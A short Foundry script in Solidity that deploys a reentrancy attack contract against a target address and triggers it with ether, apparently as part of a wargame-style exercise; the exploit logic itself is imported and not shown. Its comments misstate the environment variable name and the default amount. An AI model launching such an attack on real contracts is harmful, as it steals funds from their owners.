// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {ReentrancyAttack} from "../src/ReentranceAttack.sol";

contract ReentranceAttackScript is Script {
	// Configure these via environment: PRIVATE_KEY, REENTRANCE_ADDRESS.
	// Optional: ATTACK_AMOUNT_WEI (defaults to 0.00001 ether).
	function run() external {
		uint256 deployerPk = vm.envUint("PRIVATE_KEY");
		address target = vm.envAddress("INSTANCE_ADDRESS");
		uint256 amount = vm.envOr("ATTACK_AMOUNT_WEI", uint256(0.00072 ether));

		vm.startBroadcast(deployerPk);

		ReentrancyAttack attacker = new ReentrancyAttack(target);
		attacker.attack{value: amount}();

		vm.stopBroadcast();
	}
}
